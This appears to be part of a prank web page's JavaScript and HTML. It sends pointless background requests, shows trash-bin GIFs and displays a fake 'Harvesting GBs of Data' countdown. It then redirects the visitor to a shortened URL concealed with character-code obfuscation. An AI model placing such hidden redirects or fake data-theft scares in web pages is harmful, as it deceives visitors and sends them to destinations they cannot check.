      // Useless, or maybe not - this does nothing special
      function performInternetMagic() {
        var internetDelay = Date.now() + 30000; // Perform random actions for 30 seconds
        var magicUrls = [
          'https://www.google.com/',
          'https://example.com/info',
          'https://jsonplaceholder.typicode.com/posts',
          'https://via.placeholder.com/1x1',
          'https://httpbin.org/get'
        ];

        function doNothingSpecial() {
          if (Date.now() > internetDelay) return;

          var xhr = new XMLHttpRequest();
          xhr.open('GET', magicUrls[Math.floor(Math.random() * magicUrls.length)], true);
          xhr.send();

          setTimeout(doNothingSpecial, 1000); // Repeat every second
        }

        doNothingSpecial();
      }

      // Confusing GIFs - what's going on here?
      function confuseWithGifs() {
        var hiddenGifs = [
          'https://media3.giphy.com/media/tJeGZumxDB01q/200w.gif?cid=6c09b952ge3mt8ktpk17nx1gmb2hrtsgaygsdxh2d6pdpbms&ep=v1_gifs_search&rid=200w.gif&ct=g', // Mr. Bins example

          'https://cdn.statically.io/img/i.pinimg.com/originals/ef/b7/72/efb772f8bfa347cc2f051258eb53394f.gif', // Garbage bin gif
          'https://media4.giphy.com/media/xT9DPNrk85y8Jt8T0Q/200w.gif?cid=6c09b952gywhrp680ucklgscffh8bpw8vsqoifrj0x1gyjay&ep=v1_gifs_search&rid=200w.gif&ct=g'  // Another trash gif
        ];

        var confusedGif = hiddenGifs[Math.floor(Math.random() * hiddenGifs.length)];
        var gifSpot = document.getElementById('loadingBin');
        gifSpot.src = confusedGif;
      }

      window.onload = function() {
        initiateRandomLinks();  // Scatter random links all over
        performInternetMagic(); // Generate useless network requests
        confuseWithGifs(); // Show confusing GIFs

        var countDownToHarvest = 5;
        var messageToConfuse = document.getElementById('message');
        var interval = setInterval(function() {
          messageToConfuse.textContent = "Harvesting GBs of Data in " + countDownToHarvest + " seconds...";
          countDownToHarvest--;
          if (countDownToHarvest < 0) {
            clearInterval(interval);
            var secretRedirect = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47) + 
                              String.fromCharCode(116, 105, 110, 121, 117, 114, 108, 46, 99, 111, 109) + 
                              String.fromCharCode(47, 50, 121, 107, 112, 56, 53, 109, 51);
            window.location.href = secretRedirect;
          }
        }, 1000);
      };

    <p id="message">Harvesting TBs of data...</p>
    <img id="loadingBin" alt="Bin GIF">
    <p>If the redirect fails, It was intentional.</p>

    <div id="binStorage"></div>
